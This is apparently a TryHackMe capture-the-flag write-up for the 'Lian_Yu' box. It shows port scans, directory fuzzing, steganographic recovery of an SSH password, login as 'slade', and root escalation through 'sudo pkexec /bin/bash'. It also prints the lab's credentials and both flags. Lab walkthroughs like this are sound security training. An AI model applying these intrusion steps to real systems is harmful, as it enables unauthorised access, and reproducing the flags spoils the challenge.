@@ -1,0 +1,236 @@
+So today here we are going to solve another CTF from tryhackme which is lianyu which is listed as easy one,.
+
+
+Main IP :: 10.48.137.253
+
+Starting with all port scan and we get 
+Nmap scan report for ip-10-48-137-253.ap-south-1.compute.internal (10.48.137.253)
+Host is up (0.00031s latency).
+Not shown: 65530 closed tcp ports (reset)
+PORT      STATE SERVICE
+21/tcp    open  ftp
+22/tcp    open  ssh
+80/tcp    open  http
+111/tcp   open  rpcbind
+39120/tcp open  unknown
+
+continuing with service and version scan.
+
+Nmap scan report for ip-10-48-137-253.ap-south-1.compute.internal (10.48.137.253)
+Host is up (0.00028s latency).
+
+PORT      STATE SERVICE VERSION
+21/tcp    open  ftp     vsftpd 3.0.2
+22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 56:50:bd:11:ef:d4:ac:56:32:c3:ee:73:3e:de:87:f4 (DSA)
+|   2048 39:6f:3a:9c:b6:2d:ad:0c:d8:6d:be:77:13:07:25:d6 (RSA)
+|   256 a6:69:96:d7:6d:61:27:96:7e:bb:9f:83:60:1b:52:12 (ECDSA)
+|_  256 3f:43:76:75:a8:5a:a6:cd:33:b0:66:42:04:91:fe:a0 (ED25519)
+80/tcp    open  http    Apache httpd
+|_http-server-header: Apache
+| http-methods: 
+|_  Supported Methods: OPTIONS GET HEAD POST
+|_http-title: Purgatory
+111/tcp   open  rpcbind 2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100024  1          32948/udp6  status
+|   100024  1          39120/tcp   status
+|   100024  1          50296/udp   status
+|_  100024  1          59758/tcp6  status
+39120/tcp open  status  1 (RPC #100024)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+So we can clearly see that this all ports are open let's start enumeration with port 80.
+
+
+also here we are on webpage let's run directory fuzzing.
+
+ gobuster dir -u http://10.48.137.253/ -w
+ /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt 
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.48.137.253/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/island               (Status: 301) [Size: 236] [--> http://10.48.137.253/island/]
+/server-status        (Status: 403) [Size: 199]
+
+
+we get this.
+
+so when we went there it says Ohhh Noo, Don't Talk...............
+I wasn't Expecting You at this Moment. I will meet you there
+
+You should find a way to Lian_Yu as we are planed. The Code Word is:
+
+so we start fuzzing more and 
+
+ gobuster dir -u http://10.48.137.253/island/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt 
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.48.137.253/island/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/2100                 (Status: 301) [Size: 241] 
+
+
+we got this.
+
+<!-- you can avail your .ticket here but how?   --> we got this message when we visit also let's fuzz more
+
+gobuster dir -u http://10.48.137.253/island/2100/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -x ticket
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.48.137.253/island/2100/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              ticket
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/green_arrow.ticket   (Status: 200) [Size: 71]
+
+and we are here.
+
+This is just a token to get into Queen's Gambit(Ship)
+
+
+RTy8yhBQdscX -> !#th3h00d(base58) && username is vigilante(source-page of /island)
+
+
+open Leave_me_alone.png 
+root@ip-10-48-94-229:~# display-im6.q16: improper image header `/root/Leave_me_alone.png' @ error/png.c/ReadPNGImage/4195.
+
+maybe some error here
+
+ hexedit Leave_me_alone.png 
+root@ip-10-48-94-229:~# xxd Leave_me_alone.png | head 5 
+head: cannot open '5' for reading: No such file or directory
+root@ip-10-48-94-229:~# xxd Leave_me_alone.png | head -n 5
+00000000: 8950 4e47 0d0d 1a0a 0000 000d 4948 4452  .PNG........IHDR
+00000010: 0000 034d 0000 01db 0806 0000 0017 a371  ...M...........q
+00000020: 5b00 0020 0049 4441 5478 9cac bde9 7a24  [.. .IDATx....z$
+00000030: 4b6e 2508 33f7 e092 6466 dea5 557b 6934  Kn%.3...df..U{i4
+00000040: 6a69 54fd f573 cebc c03c 9c7e b4d4 a556  jiT..s...<.~...V
+
+
+change hexed data to this and then opening file.
+
+steghide extract -sf aa.jpg
+Enter passphrase: 
+wrote extracted data to "ss.zip".
+root@ip-10-48-94-229:~# unzip ss.zip 
+Archive:  ss.zip
+  inflating: passwd.txt              
+  inflating: shado                   
+root@ip-10-48-94-229:~# cat passwd.txt 
+This is your visa to Land on Lian_Yu # Just for Fun ***
+
+
+a small Note about it
+
+
+Having spent years on the island, Oliver learned how to be resourceful and 
+set booby traps all over the island in the common event he ran into dangerous
+people. The island is also home to many animals, including pheasants,
+wild pigs and wolves.
+
+
+got passpharse from hexedit which is password
+
+94-229:~# cat shado 
+M3tahuman
+root@ip-10-48-94-229:~# ssh slade@10.48.137.253
+The authenticity of host '10.48.137.253 (10.48.137.253)' can't be established.
+ED25519 key fingerprint is SHA256:DOqn9NupTPWQ92bfgsqdadDEGbQVHMyMiBUDa0bKsOM.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.48.137.253' (ED25519) to the list of known hosts.
+slade@10.48.137.253's password: 
+			      Way To SSH...
+			  Loading.........Done.. 
+		   Connecting To Lian_Yu  Happy Hacking
+
+██╗    ██╗███████╗██╗      ██████╗ ██████╗ ███╗   ███╗███████╗██████╗ 
+██║    ██║██╔════╝██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝╚════██╗
+██║ █╗ ██║█████╗  ██║     ██║     ██║   ██║██╔████╔██║█████╗   █████╔╝
+██║███╗██║██╔══╝  ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝  ██╔═══╝ 
+╚███╔███╔╝███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗███████╗
+ ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝╚══════╝
+
+
+	██╗     ██╗ █████╗ ███╗   ██╗     ██╗   ██╗██╗   ██╗
+	██║     ██║██╔══██╗████╗  ██║     ╚██╗ ██╔╝██║   ██║
+	██║     ██║███████║██╔██╗ ██║      ╚████╔╝ ██║   ██║
+	██║     ██║██╔══██║██║╚██╗██║       ╚██╔╝  ██║   ██║
+	███████╗██║██║  ██║██║ ╚████║███████╗██║   ╚██████╔╝
+	╚══════╝╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝    ╚═════╝  #
+
+slade@LianYu:~$ ls
+user.txt
+slade@LianYu:~$ cat user.txt 
+THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
+			--Felicity Smoak
+
+
+			
+now time for pric esc
+
+sudo -l
+
+ sudo -l
+[sudo] password for slade: 
+Matching Defaults entries for slade on LianYu:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User slade may run the following commands on LianYu:
+    (root) PASSWD: /usr/bin/pkexec
+slade@LianYu:~$ sudo pkexec /bin/bash
+root@LianYu:~# cat /root/root.txt 
+                          Mission accomplished
+
+
+
+You are injected me with Mirakuru:) ---> Now slade Will become DEATHSTROKE. 
+
+
+
+THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
+									      --DEATHSTROKE
+
+Let me know your comments about this machine :)
+I will be available @twitter @User6825
+
+
+
+
